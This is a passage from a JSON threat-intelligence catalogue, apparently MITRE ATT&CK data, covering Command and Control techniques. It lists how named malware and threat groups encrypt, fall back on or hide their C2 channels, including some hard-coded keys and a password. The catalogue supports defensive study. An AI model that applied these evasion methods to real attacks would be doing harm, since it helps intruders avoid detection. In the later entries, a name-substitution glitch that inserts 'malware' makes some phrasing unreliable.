                        "Name": "SideTwist",
                        "Description": "<name> can encrypt C2 communications with a randomly generated key.[128]"
                    },
                    "S1110": {
                        "ID": "S1110",
                        "Name": "SLIGHTPULSE",
                        "Description": "<name> can RC4 encrypt all incoming and outgoing C2 messages.[129]"
                    },
                    "S0633": {
                        "ID": "S0633",
                        "Name": "Sliver",
                        "Description": "<name> can use AES-GCM-256 to encrypt a session key for C2 message exchange.[130]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> has encrypted its C2 traffic with RC4.[131]"
                    },
                    "S0159": {
                        "ID": "S0159",
                        "Name": "SNUGRIDE",
                        "Description": "<name> encrypts C2 traffic using AES with a static key.[132]"
                    },
                    "S0627": {
                        "ID": "S0627",
                        "Name": "SodaMaster",
                        "Description": "<name> can use RC4 to encrypt C2 communications.[133]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> has encrypted its C2 communications with AES.[134]"
                    },
                    "G0038": {
                        "ID": "G0038",
                        "Name": "Stealth Falcon",
                        "Description": "<name> malware encrypts C2 traffic using RC4 with a hard-coded key.[135]"
                    },
                    "S1034": {
                        "ID": "S1034",
                        "Name": "StrifeWater",
                        "Description": "<name> can encrypt C2 traffic using XOR with a hard coded key.[136]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> encodes the payload of system information sent to the command and control servers using a one byte 0xFF XOR key. <name> also uses a 31-byte long static byte string to XOR data sent to command and control servers. The servers use a different static key to encrypt replies to the implant.[137]"
                    },
                    "S0559": {
                        "ID": "S0559",
                        "Name": "SUNBURST",
                        "Description": "<name> encrypted C2 traffic using a single-byte-XOR cipher.[138]"
                    },
                    "S0060": {
                        "ID": "S0060",
                        "Name": "Sys10",
                        "Description": "<name> uses an XOR 0x1 loop to encrypt its C2 domain.[139]"
                    },
                    "S0663": {
                        "ID": "S0663",
                        "Name": "SysUpdate",
                        "Description": "<name> has used DES to encrypt all C2 communications.[140]"
                    },
                    "S0011": {
                        "ID": "S0011",
                        "Name": "Taidoor",
                        "Description": "<name> uses RC4 to encrypt the message body of HTTP content.[141][142]"
                    },
                    "S0586": {
                        "ID": "S0586",
                        "Name": "TAINTEDSCRIBE",
                        "Description": "<name> uses a Linear Feedback Shift Register (LFSR) algorithm for network encryption.[143]"
                    },
                    "S0678": {
                        "ID": "S0678",
                        "Name": "Torisma",
                        "Description": "<name> has encrypted its C2 communications using XOR and VEST-32.[144]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> uses a custom crypter leveraging Microsoft\u2019s CryptoAPI to encrypt C2 traffic.[145]Newer versions of <name> have been known to use bcrypt to encrypt and digitally sign responses to their C2 server. [146]"
                    },
                    "S0436": {
                        "ID": "S0436",
                        "Name": "TSCookie",
                        "Description": "<name> has encrypted network communications with RC4.[147]"
                    },
                    "S0333": {
                        "ID": "S0333",
                        "Name": "UBoatRAT",
                        "Description": "<name> encrypts instructions in its C2 network payloads using a simple XOR cipher.[148]"
                    },
                    "S0275": {
                        "ID": "S0275",
                        "Name": "UPPERCUT",
                        "Description": "Some versions of <name> have used the hard-coded string \"this is the encrypt key\" for Blowfish encryption when communicating with a C2. Later versions have hard-coded keys uniquely for each C2 address.[149]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> can encrypt the data beneath its http2 or tcp encryption at the session layer with CAST-128, using a different key for incoming and outgoing data.[150]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "<name> uses a simple XOR cipher to encrypt traffic and files.[151]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used a version of the Awen web shell that employed AES encryption and decryption for C2 communications.[152]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> can encrypt its C2 with RC4 with the password warzone160\\x00.[153]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> can encrypt HTTP POST data using RC6 and a dynamically generated AES key encrypted with a hard coded RSA public key.[154][155][156]"
                    },
                    "S0430": {
                        "ID": "S0430",
                        "Name": "Winnti for Linux",
                        "Description": "<name> has used a custom TCP protocol with four-byte XOR for command and control (C2).[157]"
                    },
                    "S0141": {
                        "ID": "S0141",
                        "Name": "Winnti for Windows",
                        "Description": "<name> can XOR encrypt C2 traffic.[158]"
                    },
                    "S1115": {
                        "ID": "S1115",
                        "Name": "WIREFIRE",
                        "Description": "<name> can AES encrypt process output sent from compromised devices to C2.[159]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can use AES-CBC to encrypt data sent to its C2 server.[160]"
                    },
                    "S0653": {
                        "ID": "S0653",
                        "Name": "xCaon",
                        "Description": "<name> has encrypted data sent to the C2 server using a XOR key.[161]"
                    },
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> uses RC4 encryption over TCP to communicate with its C2 server.[162]"
                    },
                    "S0230": {
                        "ID": "S0230",
                        "Name": "ZeroT",
                        "Description": "<name> has used RC4 to encrypt C2 traffic.[163][164]"
                    },
                    "S1114": {
                        "ID": "S1114",
                        "Name": "ZIPLINE",
                        "Description": "<name> can use AES-128-CBC to encrypt data for both upload and download.[83]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used AES encrypted communications in C2.[165]"
                    }
                }
            },
            "002": {
                "name": "Asymmetric Cryptography",
                "href": "/techniques/T1573/002",
                "description": "Adversaries may employ a known asymmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Asymmetric cryptography, also known as public key cryptography, uses a keypair per party: one public that can be freely distributed, and one private. Due to how the keys are generated, the sender encrypts data with the receiver\u2019s public key and the receiver decrypts the data with their private key. This ensures that only the intended recipient can read the encrypted data. Common public key encryption algorithms include RSA and ElGamal.For efficiency, many protocols (including SSL/TLS) use symmetric cryptography once a connection is established, but use asymmetric cryptography to establish or transmit a key. As such, these protocols are classified as Asymmetric Cryptography.",
                "Procedure": {
                    "S0202": {
                        "ID": "S0202",
                        "Name": "adbupd",
                        "Description": "<name> contains a copy of the OpenSSL library to encrypt C2 traffic.[1]"
                    },
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "A variant of <name> encrypts some C2 with RSA.[2]"
                    },
                    "S0438": {
                        "ID": "S0438",
                        "Name": "Attor",
                        "Description": "<name>'s Blowfish key is encrypted with a public RSA key.[3]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can beacon to a hardcoded C2 IP address using TLS encryption every 5 minutes.[4]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can use TLS in C2 communications.[5]"
                    },
                    "S0017": {
                        "ID": "S0017",
                        "Name": "BISCUIT",
                        "Description": "<name> uses SSL for encrypting C2 communications.[6]"
                    },
                    "C0021": {
                        "ID": "C0021",
                        "Name": "C0021",
                        "Description": "During <name>, the threat actors used SSL via TCP port 443 for C2 communications.[7]"
                    },
                    "S0335": {
                        "ID": "S0335",
                        "Name": "Carbon",
                        "Description": "<name> has used RSA encryption for C2 communications.[8]"
                    },
                    "S0023": {
                        "ID": "S0023",
                        "Name": "CHOPSTICK",
                        "Description": "<name> encrypts C2 communications with TLS.[9]"
                    },
                    "S1105": {
                        "ID": "S1105",
                        "Name": "COATHANGER",
                        "Description": "<name> connects to command and control infrastructure using SSL.[10]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used the Plink utility to create SSH tunnels.[11]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use RSA asymmetric encryption with PKCS1 padding to encrypt data sent to the C2 server.[12]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> can use SSL/TLS encryption for its HTTP-based C2 channel. <name> has used public key cryptography with RSA and AES encrypted email attachments for its Gmail C2 channel.[13][14]"
                    },
                    "S0687": {
                        "ID": "S0687",
                        "Name": "Cyclops Blink",
                        "Description": "<name> can encrypt C2 messages with AES-256-CBC sent underneath TLS. OpenSSL library functions are also used to encrypt each message using a randomly generated key and IV, which are then encrypted using a hard-coded RSA public key.[15]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> can use TLS to encrypt its C2 channel.[16]"
                    },
                    "S0600": {
                        "ID": "S0600",
                        "Name": "Doki",
                        "Description": "<name> has used the embedTLS library for network communications.[17]"
                    },
                    "S0384": {
                        "ID": "S0384",
                        "Name": "Dridex",
                        "Description": "<name> has encrypted traffic with RSA.[18]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> is known to use RSA keys for encrypting C2 traffic. [19]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can use TLS to encrypt its C2 channel.[20]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> used the Plink command-line utility to create SSH tunnels to C2 servers.[21]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used the Plink utility to tunnel RDP back to C2 infrastructure.[22]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> uses custom encryption for C2 that uses RSA.[23][24]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> has RSA-encrypted its communication with the C2 server.[25]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can use SSL in C2 communication.[26]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> encrypts communications using RSA-2048.[27]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can use a hardcoded server public RSA key to encrypt the first request to C2.[28]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> encrypts C2 traffic with TLS.[29]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has used SSL and TLS in communications with C2.[30][31]"
                    },
                    "S1051": {
                        "ID": "S1051",
                        "Name": "KEYPLUG",
                        "Description": "<name> can use TLS-encrypted WebSocket Protocol (WSS) for C2.[32]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> can use SSL and TLS for communications.[33]"
                    },
                    "S0641": {
                        "ID": "S0641",
                        "Name": "Kobalos",
                        "Description": "<name>'s authentication and key exchange is performed using RSA-512.[34][35]"
                    },
                    "S1121": {
                        "ID": "S1121",
                        "Name": "LITTLELAMB.WOOLTEA",
                        "Description": "<name> can communicate over SSL using the private key from the Ivanti Connect Secure web server.[36]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> has used TLS-encrypted FTP to exfiltrate data.[37]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name>'s C2 communication has been encrypted using OpenSSL.[38]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> contains a copy of the OpenSSL library to encrypt C2 traffic.[39]"
                    },
                    "S0699": {
                        "ID": "S0699",
                        "Name": "Mythic",
                        "Description": "<name> supports SSL encrypted C2.[40]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> used the Plink utility and other tools to create tunnels to C2 servers.[41]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors' proxy implementation \"Agent\" upgraded the socket in use to a TLS socket.[42]"
                    },
                    "S0556": {
                        "ID": "S0556",
                        "Name": "Pay2Key",
                        "Description": "<name> has used RSA encrypted communications with C2.[43]"
                    },
                    "S0587": {
                        "ID": "S0587",
                        "Name": "Penquin",
                        "Description": "<name> can encrypt communications using the BlowFish algorithm and a symmetric key exchanged with Diffie Hellman.[44]"
                    },
                    "S1123": {
                        "ID": "S1123",
                        "Name": "PITSTOP",
                        "Description": "<name> has the ability to communicate over TLS.[36]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> used TLS to encrypt command and control (C2) communications.[45]"
                    },
                    "S0150": {
                        "ID": "S0150",
                        "Name": "POSHSPY",
                        "Description": "<name> encrypts C2 traffic with AES and RSA.[46]"
                    },
                    "S0223": {
                        "ID": "S0223",
                        "Name": "POWERSTATS",
                        "Description": "<name> has encrypted C2 traffic with RSA.[47]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name>'s default encryption for its C2 communication channel is SSL, but it also has transport options for RSA and AES.[48]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> has encrypted C2 communications with the ECIES algorithm.[49]"
                    },
                    "S0448": {
                        "ID": "S0448",
                        "Name": "Rising Sun",
                        "Description": "<name> variants can use SSL for encrypting C2 communications.[50]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> has the ability to send a random 64-byte RC4 key to communicate with actor-controlled C2 servers by using an RSA public key.[51]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> may set up a reverse SSH tunnel to give the attacker access to services running on the victim, such as RDP.[52]"
                    },
                    "S0633": {
                        "ID": "S0633",
                        "Name": "Sliver",
                        "Description": "<name> can use mutual TLS and RSA  cryptography to exchange a session key.[53][54][55]"
                    },
                    "S1035": {
                        "ID": "S1035",
                        "Name": "Small Sieve",
                        "Description": "<name> can use SSL/TLS for its HTTPS Telegram Bot API-based C2 channel.[56]"
                    },
                    "S0627": {
                        "ID": "S0627",
                        "Name": "SodaMaster",
                        "Description": "<name> can use a hardcoded RSA key to encrypt some of its C2 traffic.[57]"
                    },
                    "S0615": {
                        "ID": "S0615",
                        "Name": "SombRAT",
                        "Description": "<name> can SSL encrypt C2 traffic.[58][59][60]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> has encrypted C2 traffic using SSL/TLS.[61]"
                    },
                    "S0018": {
                        "ID": "S0018",
                        "Name": "Sykipot",
                        "Description": "<name> uses SSL for encrypting C2 communications.[62]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used TLS encrypted C2 communications including for campaigns using AsyncRAT.[63]"
                    },
                    "S0668": {
                        "ID": "S0668",
                        "Name": "TinyTurla",
                        "Description": "<name> has the ability to encrypt C2 traffic with SSL/TLS.[64]"
                    },
                    "S0183": {
                        "ID": "S0183",
                        "Name": "Tor",
                        "Description": "<name> encapsulates traffic in multiple layers of encryption, using TLS by default.[65]"
                    },
                    "S0094": {
                        "ID": "S0094",
                        "Name": "Trojan.Karagany",
                        "Description": "<name> can secure C2 communications with SSL and TLS.[66]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has used SSL to connect to C2 servers.[67][68]"
                    },
                    "S0022": {
                        "ID": "S0022",
                        "Name": "Uroburos",
                        "Description": "<name> has used a combination of a Diffie-Hellman key exchange mixed with a pre-shared key (PSK) to encrypt its top layer of C2 communications.[69]"
                    },
                    "S0180": {
                        "ID": "S0180",
                        "Name": "Volgmer",
                        "Description": "Some <name> variants use SSL to encrypt C2 communications.[70]"
                    },
                    "S0366": {
                        "ID": "S0366",
                        "Name": "WannaCry",
                        "Description": "<name> uses Tor for command and control traffic and routes a custom cryptographic protocol over the Tor circuit.[71]"
                    },
                    "S0515": {
                        "ID": "S0515",
                        "Name": "WellMail",
                        "Description": "<name> can use hard coded client and certificate authority certificates to communicate with C2 over mutual TLS.[72][73]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> can communicate to C2 with mutual TLS where client and server mutually check certificates.[74][75][76][73]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can use RSA-4096 to encrypt data sent to its C2 server.[77]"
                    },
                    "S0117": {
                        "ID": "S0117",
                        "Name": "XTunnel",
                        "Description": "<name> uses SSL/TLS and RC4 to encrypt traffic.[78][9]"
                    },
                    "S0251": {
                        "ID": "S0251",
                        "Name": "Zebrocy",
                        "Description": "<name> uses SSL and AES ECB for encrypting C2 communications.[79][80][81]"
                    }
                }
            }
        },
        "tactic": "Command and Control",
        "description": "Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.",
        "Procedure": {
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has used multiple layers of encryption within malware to protect C2 communication.[1]"
            },
            "G1002": {
                "ID": "G1002",
                "Name": "BITTER",
                "Description": "malware has encrypted their C2 communications.[2]"
            },
            "S0631": {
                "ID": "S0631",
                "Name": "Chaes",
                "Description": "malware has used encryption for its C2 channel.[3]"
            },
            "S0498": {
                "ID": "S0498",
                "Name": "Cryptoistic",
                "Description": "malware can engage in encrypted communications with C2.[4]"
            },
            "S0032": {
                "ID": "S0032",
                "Name": "gh0st RAT",
                "Description": "malware has encrypted TCP communications to evade detection.[5]"
            },
            "S0681": {
                "ID": "S0681",
                "Name": "Lizar",
                "Description": "malware can support encrypted communications between the client and server.[6][7]"
            },
            "S1016": {
                "ID": "S1016",
                "Name": "MacMa",
                "Description": "malware has used TLS encryption to initialize a custom protocol for C2 communications.[8]"
            },
            "G0059": {
                "ID": "G0059",
                "Name": "Magic Hound",
                "Description": "malware has used an encrypted http proxy in C2 communications.[9]"
            },
            "S0198": {
                "ID": "S0198",
                "Name": "NETWIRE",
                "Description": "malware can encrypt C2 communications.[10]"
            },
            "S1012": {
                "ID": "S1012",
                "Name": "PowerLess",
                "Description": "malware can use an encrypted channel for C2 communications.[11]"
            },
            "S1046": {
                "ID": "S1046",
                "Name": "PowGoop",
                "Description": "malware can receive encrypted commands from C2.[12]"
            },
            "S0662": {
                "ID": "S0662",
                "Name": "RCSession",
                "Description": "malware can use an encrypted beacon to check in with C2.[13]"
            },
            "C0030": {
                "ID": "C0030",
                "Name": "Triton Safety Instrumented System Attack",
                "Description": "In the malware, TEMP.Veles used cryptcat binaries to encrypt their traffic.[14]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has encrypted traffic with the C2 to prevent network detection.[15]"
            }
        }
    },
    "T1008": {
        "ttp_name": "Fallback Channels",
        "ttp_id": "T1008",
        "href": "/techniques/T1008",
        "tactic": "Command and Control",
        "description": "Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.",
        "Procedure": {
            "S0504": {
                "ID": "S0504",
                "Name": "Anchor",
                "Description": "malware can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.[1]"
            },
            "S0622": {
                "ID": "S0622",
                "Name": "AppleSeed",
                "Description": "malware can use a second channel for C2 when the primary channel is in upload mode.[2]"
            },
            "G0096": {
                "ID": "G0096",
                "Name": "APT41",
                "Description": "malware used the Steam community page as a fallback mechanism for C2.[3]"
            },
            "S0534": {
                "ID": "S0534",
                "Name": "Bazar",
                "Description": "malware has the ability to use an alternative C2 server if the primary server fails.[4]"
            },
            "S0017": {
                "ID": "S0017",
                "Name": "BISCUIT",
                "Description": "malware malware contains a secondary fallback command and control server that is contacted after the primary command and control server.[5][6]"
            },
            "S0089": {
                "ID": "S0089",
                "Name": "BlackEnergy",
                "Description": "malware has the capability to communicate over a backup channel via plus.google.com.[7]"
            },
            "S1039": {
                "ID": "S1039",
                "Name": "Bumblebee",
                "Description": "malware can use backup C2 servers if the primary server fails.[8]"
            },
            "S0348": {
                "ID": "S0348",
                "Name": "Cardinal RAT",
                "Description": "malware can communicate over multiple C2 host and port combinations.[9]"
            },
            "S0674": {
                "ID": "S0674",
                "Name": "CharmPower",
                "Description": "malware can change its C2 channel once every 360 loops by retrieving a new domain from the actors\u2019 S3 bucket.[10]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "malware can switch to a new C2 channel if the current one is broken.[11]"
            },
            "S0538": {
                "ID": "S0538",
                "Name": "Crutch",
                "Description": "malware has used a hardcoded GitHub repository as a fallback channel.[12]"
            },
            "S0021": {
                "ID": "S0021",
                "Name": "Derusbi",
                "Description": "malware uses a backup communication method with an HTTP beacon.[13]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware has two hard-coded domains for C2 servers; if the first does not respond, it will try the second.[14]"
            },
            "S0377": {
                "ID": "S0377",
                "Name": "Ebury",
                "Description": "malware has implemented a fallback mechanism to begin using a DGA when the attacker hasn't connected to the infected system for three days.[15]"
            },
            "S0401": {
                "ID": "S0401",
                "Name": "Exaramel for Linux",
                "Description": "malware can attempt to find a new C2 server if it receives an error.[16]"
            },
            "S0512": {
                "ID": "S0512",
                "Name": "FatDuke",
                "Description": "malware has used several C2 servers per targeted organization.[17]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware's Harpy backdoor malware can use DNS as a backup channel for C2 if HTTP fails.[18]"
            },
            "S0666": {
                "ID": "S0666",
                "Name": "Gelsemium",
                "Description": "malware can use multiple domains and protocols in C2.[19]"
            },
            "S0376": {
                "ID": "S0376",
                "Name": "HOPLIGHT",
                "Description": "malware has multiple C2 channels in place in case one fails.[20]"
            },
            "S0260": {
                "ID": "S0260",
                "Name": "InvisiMole",
                "Description": "malware has been configured with several servers available for alternate C2 communications.[21][22]"
            },
            "S0044": {
                "ID": "S0044",
                "Name": "JHUHUGIT",
                "Description": "malware tests if it can reach its C2 server by first attempting a direct connection, and if it fails, obtaining proxy settings and sending the connection through a proxy, and finally injecting code into a running browser if the proxy method fails.[23]"
            },
            "S0265": {
                "ID": "S0265",
                "Name": "Kazuar",
                "Description": "malware can accept multiple URLs for C2 servers.[24]"
            },
            "S1020": {
                "ID": "S1020",
                "Name": "Kevin",
                "Description": "malware can assign hard-coded fallback domains for C2.[25]"
            },
            "S0236": {
                "ID": "S0236",
                "Name": "Kwampirs",
                "Description": "malware uses a large list of C2 servers that it cycles through until a successful connection is established.[26]"
            },
            "G0032": {
                "ID": "G0032",
                "Name": "Lazarus Group",
                "Description": "malware malware SierraAlfa sends data to one of the hard-coded C2 servers chosen at random, and if the transmission fails, chooses a new C2 server to attempt the transmission again.[27][28]"
            },
            "S0211": {
                "ID": "S0211",
                "Name": "Linfo",
                "Description": "malware creates a backdoor through which remote attackers can change C2 servers.[29]"
            },
            "S0409": {
                "ID": "S0409",
                "Name": "Machete",
                "Description": "malware has sent data over HTTP if FTP failed, and has also used a fallback server.[30]"
            },
            "S0051": {
                "ID": "S0051",
                "Name": "MiniDuke",
                "Description": "malware uses Google Search to identify C2 servers if its primary C2 method via Twitter is not working.[31]"
            },
            "S0084": {
                "ID": "S0084",
                "Name": "Mis-Type",
                "Description": "malware first attempts to use a Base64-encoded network protocol over a raw TCP socket for C2, and if that method fails, falls back to a secondary HTTP-based protocol to communicate to an alternate C2 server.[32]"
            },
            "S0699": {
                "ID": "S0699",
                "Name": "Mythic",
                "Description": "malware can use a list of C2 URLs as fallback mechanisms in case one IP or domain gets blocked.[33]"
            },
            "S0034": {
                "ID": "S0034",
                "Name": "NETEAGLE",
                "Description": "malware will attempt to detect if the infected host is configured to a proxy. If so, malware will send beacons via an HTTP POST request; otherwise it will send beacons via UDP/6000.[34]"
            },
            "C0002": {
                "ID": "C0002",
                "Name": "Night Dragon",
                "Description": "During malware, threat actors used company extranet servers as secondary C2 servers.[35]"
            },
            "G0049": {
                "ID": "G0049",
                "Name": "OilRig",
                "Description": "malware malware ISMAgent falls back to its DNS tunneling mechanism if it is unable to reach the C2 server over HTTP.[36]"
            },
            "S0501": {
                "ID": "S0501",
                "Name": "PipeMon",
                "Description": "malware can switch to an alternate C2 domain when a particular date has been reached.[37]"
            },
            "S0269": {
                "ID": "S0269",
                "Name": "QUADAGENT",
                "Description": "malware uses multiple protocols (HTTPS, HTTP, DNS) for its C2 server as fallback channels if communication with one is unsuccessful.[38]"
            },
            "S1084": {
                "ID": "S1084",
                "Name": "QUIETEXIT",
                "Description": "malware can attempt to connect to a second hard-coded C2 if the first hard-coded C2 address fails.[39]"
            },
            "S0629": {
                "ID": "S0629",
                "Name": "RainyDay",
                "Description": "malware has the ability to switch between TCP and HTTP for C2 if one method is not working.[40]"
            },
            "S0495": {
                "ID": "S0495",
                "Name": "RDAT",
                "Description": "malware has used HTTP if DNS C2 communications were not functioning.[41]"
            },
            "S0085": {
                "ID": "S0085",
                "Name": "S-Type",
                "Description": "malware primarily uses port 80 for C2, but falls back to ports 443 or 8080 if initial communication fails.[32]"
            },
            "S1019": {
                "ID": "S1019",
                "Name": "Shark",
                "Description": "malware can update its configuration to use a different C2 server.[42]"
            },
            "S0444": {
                "ID": "S0444",
                "Name": "ShimRat",
                "Description": "malware has used a secondary C2 location if the first was unavailable.[43]"
            },
            "S0610": {
                "ID": "S0610",
                "Name": "SideTwist",
                "Description": "malware has primarily used port 443 for C2 but can use port 80 as a fallback.[44]"
            },
            "S0058": {
                "ID": "S0058",
                "Name": "SslMM",
                "Description": "malware has a hard-coded primary and backup C2 string.[45]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware has the ability to generate new C2 domains.[46]"
            },
            "S0586": {
                "ID": "S0586",
                "Name": "TAINTEDSCRIBE",
                "Description": "malware can randomly pick one of five hard-coded IP addresses for C2 communication; if one of the IP fails, it will wait 60 seconds and then try another IP address.[47]"
            },
            "S0668": {
                "ID": "S0668",
                "Name": "TinyTurla",
                "Description": "malware can go through a list of C2 server IPs and will try to register with each until one responds.[48]"
            },
            "S0266": {
                "ID": "S0266",
                "Name": "TrickBot",
                "Description": "malware can use secondary C2 servers for communication after establishing connectivity and relaying victim information to primary C2 servers.[1]"
            },
            "S0022": {
                "ID": "S0022",
                "Name": "Uroburos",
                "Description": "malware can use up to 10 channels to communicate between implants.[49]"
            },
            "S0476": {
                "ID": "S0476",
                "Name": "Valak",
                "Description": "malware can communicate over multiple C2 hosts.[50]"
            },
            "S0059": {
                "ID": "S0059",
                "Name": "WinMM",
                "Description": "malware is usually configured with primary and backup domains for C2 communications.[45]"
            },
            "S0117": {
                "ID": "S0117",
                "Name": "XTunnel",
                "Description": "The C2 server used by malware provides a port number to the victim to use as a fallback in case the connection closes on the currently used port.[11]"
            }
        }
    },
    "T1665": {
        "ttp_name": "Hide Infrastructure",
        "ttp_id": "T1665",
        "href": "/techniques/T1665",
        "tactic": "Command and Control",
        "description": "Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,[1] masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,[2][3][4] and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely.C2 networks may include the use of Proxy or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.[5][6]Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.[7][8] Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., Virtualization/Sandbox Evasion).[1][7]Hiding C2 infrastructure may also be supported by Resource Development activities such as Acquire Infrastructure and Compromise Infrastructure. For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.[9][10]",
        "Procedure": {
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware uses compromised residential endpoints, typically within the same ISP IP address range, as proxies to hide the true source of C2 traffic.[11]"
            },
            "S1111": {
                "ID": "S1111",
                "Name": "DarkGate",
                "Description": "malware command and control includes hard-coded domains in the malware masquerading as legitimate services such as Akamai CDN or Amazon Web Services.[12]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 set the hostnames of their C2 infrastructure to match legitimate hostnames in the victim environment. They also used IP addresses originating from the same country as the victim for their VPN infrastructure.[13]"
            }
        }
    },
    "T1105": {
        "ttp_name": "Ingress Tool Transfer",
        "ttp_id": "T1105",
        "href": "/techniques/T1105",
        "tactic": "Command and Control",
